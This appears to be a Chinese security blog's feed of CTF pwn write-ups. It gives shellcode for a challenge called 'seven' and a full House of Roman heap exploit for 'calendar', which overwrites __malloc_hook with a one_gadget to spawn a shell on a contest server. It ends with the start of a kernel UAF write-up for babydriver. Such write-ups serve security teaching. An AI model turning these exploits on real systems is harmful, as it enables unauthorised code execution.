class="line"><span class="comment">#p=remote('117.78.26.97', 32200)#process('./seven')</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.readuntil(<span class="string">'shellcode:'</span>)</span><br><span class="line">payload=chr(<span class="number">0x54</span>)+chr(<span class="number">0x5e</span>)+chr(<span class="number">0x8b</span>)+chr(<span class="number">0xd6</span>)+chr(<span class="number">0x0F</span>)+chr(<span class="number">0x05</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">z=[</span><br><span class="line"><span class="number">0xB8</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8B</span>, <span class="number">0xFE</span>, <span class="number">0x48</span>, <span class="number">0x81</span>, <span class="number">0xC7</span>, <span class="number">0x4e</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x4b</span>, <span class="number">0x48</span>,<span class="number">0x33</span>, <span class="number">0xD2</span>, <span class="number">0x48</span>,</span><br><span class="line"><span class="number">0x33</span>, <span class="number">0xF6</span>, <span class="number">0x0F</span>, <span class="number">0x05</span>, <span class="number">0x2F</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6E</span>, <span class="number">0x2F</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x00</span>]</span><br><span class="line">zz=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(z)):</span><br><span class="line">    zz+=chr(z[i])</span><br><span class="line">payload=<span class="string">'b'</span>*<span class="number">0xb36</span>+zz</span><br><span class="line">p.writeline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="calendar"><a href="#calendar" class="headerlink" title="calendar"></a>calendar</h2><p>此题无论从题目给定的条件和hint都说明是House of Roman。</p><p>这个利用方法半年以前被提出，主要思路是解决无法泄露地址时，通过低位地址写+爆破的方法来对抗aslr。可以参考<a href="https://xz.aliyun.com/t/2316" target="_blank" rel="noopener">https://xz.aliyun.com/t/2316</a></p><h3 id="题目及漏洞分析-1"><a href="#题目及漏洞分析-1" class="headerlink" title="题目及漏洞分析"></a>题目及漏洞分析</h3><p>题目功能很简单了，提供了add、edit、free三个功能，并且不限制次数，但只提供4个指针位置了。</p><p>其中，程序的读取输入函数存在off_by_one漏洞。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">read_n_off_by_one</span><span class="params">(__int64 a1, <span class="keyword">signed</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+13h] [rbp-Dh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt;= a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL) &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"read error"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( buf == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)((<span class="keyword">signed</span> <span class="keyword">int</span>)i + a1) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_BYTE *)(a1 + (<span class="keyword">signed</span> <span class="keyword">int</span>)i) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而free函数没有置空指针，导致存在UAF漏洞。</p><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>知道了漏洞条件后就利用了，对比最初的House of Roman，题目增加了对内存块大小的限制，大小限制在fastbin中，但是并通过off-by-one + free可以构造unsorted bin。</p><p>可以看一下原始的House of Roman是如何利用的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1. 首先分配 3 个 chunk （A , B, C） ，大小分别为 0x20, 0xd0, 0x70</span><br><span class="line">2. 在 B + 0x78 处设置 p64(0x61) ， 作用是 fake size ,用于后面 的 fastbin attack</span><br><span class="line">释放掉 B , B 进入 unsorted bin , 此时 B+0x10 和 B+0x18 中有 main_arean 的地址</span><br><span class="line">再次分配 0xd0 , 会分配到 B， 此时 B+0x10 和 B+0x18 中 main_arean 的地址依然存在</span><br><span class="line">然后分配 3 个 0x70 的 chunk (D , E, F)， 为后续做准备</span><br><span class="line">3. 在 A 触发 单字节溢出，修改 B-&gt;size = 0x71 . 然后释放 C , D， 此时 C , D 进入 fastbin , 同时 D-&gt;fd = C. 由于 chunk之间的相对偏移固定，于是利用 uaf 修改 D-&gt;fd 的低 字节 ，使得 D-&gt;fd=B</span><br><span class="line">4. 此时 B-&gt;size = 0x71 ，同时 B + 0x78 为 p64(0x61) （第2步设置）， 这就成功伪造了一个 0x70 大小的 fastbin。 此时 B-&gt;fd 为 main_arean 的地址，于是通过 修改 低 2个字节，可以修改到 malloc_hook - 0x23 处 （ malloc_hook - 0x23 + 0x8 处的值为 p64(0x7f) )</span><br><span class="line">5. 然后分配 3 次 0x70 的 chunk， 就可以拿到包含 malloc_hook 的 chunk, 此时 malloc_hook 内容为 0</span><br><span class="line">6. 然后利用 unsorted bin 修改 malloc_hook 内容为 main_arean 的地址</span><br><span class="line">7. 利用部分写修改 malloc_hook 为 one_gadget</span><br><span class="line">8. 多次释放一个指针，触发 double free 异常，进而触发 malloc_printerr ， getshell</span><br></pre></td></tr></table></figure><p>总结一下就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 通过unsorted bin的分配与释放，再次分配时可以得到main_arena+88这个地址，通过写低字节可以写为__malloc_hook-0x23。</span><br><span class="line">2. 释放当初申请的堆块，通过修改堆块第地址的方法，让修改为__malloc_hook-0x23的堆块进入0x70的fastbin链。因而可以通过malloc得到__malloc_hook-0x23这个堆块</span><br><span class="line">3. 通过unsorted bin attack让__malloc_hook处置为main_arena+88，再通过写低字节，将其写为one_gadget，从而拿到shell。</span><br></pre></td></tr></table></figure><p>可以看到最初的aslr随机为是32比特，爆破概率为1/4294967296，而用此方法可将爆破概率提高为1/2**12 = 1/4096。（由one_gadget与main_arena+88偏移决定）</p><p>此题由于没有unsorted bin，所以可以用一字节溢出，再释放的方法得到unsorted bin，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\xe1'</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>当得到这个unsorted bin之后，再将其分配出来。</p><p>0 ,3 分别是unsorted bin的两部分，2是用于防止合并。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>) <span class="comment"># first chunk of unsorted bin </span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>) <span class="comment"># second chunk of unsorted bin</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br></pre></td></tr></table></figure><p>通过对0的低地址写，可以将其fd写为__malloc_hook-0x23。</p><p>然后释放3、2两个块，此时fastbin上存在两个块。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,p64(libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)[:<span class="number">2</span>] ) </span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>当对2块低地址写，可以将2块的fd指向0块，此时0块进入fastbin，其fd是__malloc_hook-0x23。并且可将__malloc_hook-0x23申请回来，存在3的位置上。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">2</span>,<span class="number">1</span>,<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>)  <span class="comment"># malloc_hook -0x23 is here</span></span><br><span class="line"><span class="comment">#repair fastbin</span></span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">7</span>,p64(<span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>接下来就可以构造unsorted bin attack了。</p><p>首先还是同样的方法得到unsorted bin，由于unsorted bin attack 需要满足一些size的检测，因此提前构造堆结构：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x67</span>,(p64(<span class="number">0x70</span>)+p64(<span class="number">0x20</span>))*<span class="number">4</span>+(p64(<span class="number">0x20</span>)+p64(<span class="number">0x21</span>))*<span class="number">2</span>+<span class="string">'\n'</span> )</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line"><span class="comment">#add(2,0x68)</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\xe1'</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br></pre></td></tr></table></figure><p>当前的unsorted bin 大小还是很大，由于限制不能分配出来，因此再次将unsorted bin size改成0x71，并且将bk改为__malloc_hook-0x10。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\x71'</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x49</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+<span class="string">'a'</span>*<span class="number">0x18</span>+p64(<span class="number">0x71</span>)+<span class="string">'a'</span>*<span class="number">8</span>+ p64(libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x10</span>)[:<span class="number">2</span>]  )</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br></pre></td></tr></table></figure><p>此时，__malloc_hook被写为main_arena+88，再次通过低字节写的方法，将其改为one_gadget，就可以拿到shell了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">3</span>,<span class="number">0x15</span>,<span class="string">'a'</span>*<span class="number">0x13</span>+p64(libc_base+one_gadget[<span class="number">2</span>])[:<span class="number">3</span>])</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>剩下的事情就是爆破看RP了。。。</p><h3 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line">lib = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> lib==<span class="number">0</span>:</span><br><span class="line">libc_name = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">offset = <span class="number">0x230</span></span><br><span class="line">one_gadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">libc_name = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">offset = <span class="number">0x260</span></span><br><span class="line">one_gadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">elf = ELF(<span class="string">'./task_calendar'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">(bp = <span class="string">''</span>)</span>:</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">gdb.attach(p,bp)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base</span><span class="params">(p1)</span>:</span></span><br><span class="line">f = open(<span class="string">'/proc/'</span>+str(pidof(p1)[<span class="number">0</span>])+<span class="string">'/maps'</span>,<span class="string">'r'</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">tmp = f.readline()</span><br><span class="line"><span class="keyword">print</span> tmp</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">'libc-2.23.so'</span> <span class="keyword">in</span> tmp:</span><br><span class="line">libc_addr = int(<span class="string">'0x'</span>+tmp.split(<span class="string">'-'</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"><span class="comment">#print hex((one_gadget[0]+libc_addr)&amp;0xffffff)</span></span><br><span class="line"><span class="comment">#if p64(((one_gadget[3]+libc_addr)&amp;0xffffff))[0:3] == (two_bytes+'\x00'):</span></span><br><span class="line"><span class="comment">#if ((one_gadget[0]+libc_addr)&amp;0xffffff)==0x66c4:</span></span><br><span class="line"><span class="comment">#print 'a'*1024</span></span><br><span class="line"><span class="comment">##gdb.attach(p)</span></span><br><span class="line"><span class="comment">#f1 = open('./result','w+')</span></span><br><span class="line"><span class="comment">#f1.write('1')</span></span><br><span class="line"><span class="comment">#f1.close()</span></span><br><span class="line">f.close()</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] libc_addr :'</span>,hex(libc_addr)</span><br><span class="line"><span class="keyword">return</span> libc_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./task_calendar'</span> ,env=&#123;<span class="string">'LD_PRELOAD'</span> :libc_name&#125;)</span><br><span class="line"><span class="comment">#f = open('/proc/'+str(pidof(p)[0])+'/maps','r')</span></span><br><span class="line">libc_base = get_base(p)&amp;<span class="number">0xffffff</span></span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote( <span class="string">'117.78.26.133'</span>, <span class="number">31666</span>)<span class="comment">#process('./pwn1')</span></span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line">libc_base = <span class="number">0xf64000</span> <span class="comment"># guess libc_base</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index, size)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'choice&gt; '</span>)</span><br><span class="line">p.sendline(str(index + <span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">'size&gt; '</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, size, data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'choice&gt; '</span>)</span><br><span class="line">p.sendline(str(index + <span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">'size&gt; '</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">'info&gt; '</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'choice&gt; '</span>)</span><br><span class="line">p.sendline(str(index + <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">z(<span class="string">'c\n'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'input calendar name&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'p4nda'</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\xe1'</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#here we got a unsorted bin whose ptr in chunk1</span></span><br><span class="line"><span class="comment">#so, chunk 0,2,3 are useless</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>) <span class="comment"># first chunk of unsorted bin </span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>) <span class="comment"># second chunk of unsorted bin</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line"><span class="comment">#change the original main_arena+88 to __malloc_hook-0x23</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,p64(libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)[:<span class="number">2</span>] ) </span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#change first fd to fake chunk pointed to __malloc_hook-0x23</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">1</span>,<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>)  <span class="comment"># malloc_hook -0x23 is here</span></span><br><span class="line"><span class="comment">#repair fastbin</span></span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">7</span>,p64(<span class="number">0</span>))</span><br><span class="line"><span class="comment"># get an unsorted bin chunk first</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x67</span>,(p64(<span class="number">0x70</span>)+p64(<span class="number">0x20</span>))*<span class="number">4</span>+(p64(<span class="number">0x20</span>)+p64(<span class="number">0x21</span>))*<span class="number">2</span>+<span class="string">'\n'</span> )</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line"><span class="comment">#add(2,0x68)</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\xe1'</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+<span class="string">'\x71'</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x49</span>,<span class="string">'a'</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+<span class="string">'a'</span>*<span class="number">0x18</span>+p64(<span class="number">0x71</span>)+<span class="string">'a'</span>*<span class="number">8</span>+ p64(libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x10</span>)[:<span class="number">2</span>]  )</span><br><span class="line"><span class="comment">#raw_input()</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x15</span>,<span class="string">'a'</span>*<span class="number">0x13</span>+p64(libc_base+one_gadget[<span class="number">2</span>])[:<span class="number">3</span>])</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      参加了护网杯CTF2018线上预选赛，队伍天枢获得第二名，记录一下本次比赛的全部PWN题
    
    </summary>
    
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>【KERNEL PWN】CISCN 2017 babydriver题解</title>
    <link href="http://p4nda.top/2018/10/11/ciscn-2017-babydriver/"/>
    <id>http://p4nda.top/2018/10/11/ciscn-2017-babydriver/</id>
    <published>2018-10-11T02:23:23.000Z</published>
    <updated>2018-11-13T11:20:53.923Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://pan.baidu.com/s/17zezRnEgd2A-vAQ-U2IZyg" target="_blank" rel="noopener">题目及相关文件下载</a>，密码：3ryy</p><p>题目参考了<a href="https://www.anquanke.com/post/id/86490" target="_blank" rel="noopener">Anciety</a>的这篇文章里讲述的方法，算是一种对于KERNEL PWN中UAF漏洞通用的提权方法。</p><p>本文参看代码linux-4.4.110源码，下载链接：<a href="https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.4.110.tar.gz" target="_blank" rel="noopener">https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.4.110.tar.gz</a></p><h1 id="Babydriver"><a href="#Babydriver" class="headerlink" title="Babydriver"></a>Babydriver</h1><h2 id="题目-amp-漏洞分析"><a href="#题目-amp-漏洞分析" class="headerlink" title="题目&amp;漏洞分析"></a>题目&amp;漏洞分析</h2><p>题目实现了babyopen、babyioctl、babyread、babywrite、babyrelease五个函数。</p><p>其中在babyopen中初始化了一个64字节的堆内存，并将这个内存地址和大小放在类似于BSS段的全局变量结构中存储。</p><p><img src="/img/babydriver/1.png" alt=""></p><p>在babyioctl中存在一个指令0x10001，这个指令可以重新制定堆块大小，将原有的内存释放，重新申请新的堆空间。</p><p><img src="/img/babydriver/2.png" alt=""></p><p>在babyread和babywrite中实现了常规的copy_from_user和copy_to_user，把堆块当做缓存，也限制了读取大小最多为babydev_struct.device_buf_len。</p><p>最后，在babyrelease中将释放申请的堆块。</p><p><img src="/img/babydriver/3.png" alt=""></p><p>该漏洞在于，内核的驱动仅加载一次。因此，驱动的全局变量是共享的，当同时打开多个文件时，babydev_struct.device_buf会被不断覆写，而在babyrelease时，会释放掉全部文件共享的缓冲区。而由于存在设置大小的函数，从而可以造成任意大小堆块的UAF漏洞。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="ptmx设备"><a href="#ptmx设备" class="headerlink" title="ptmx设备"></a>ptmx设备</h3><p>ptmx设备是tty设备的一种，当使用open函数打开时，通过系统调用进入内核，创建新的文件结构体，并执行驱动设备自实现的open函数。</p><p>具体open细节可以参考 ： <a href="https://blog.csdn.net/liushuimpc/article/details/51610941" target="_blank" 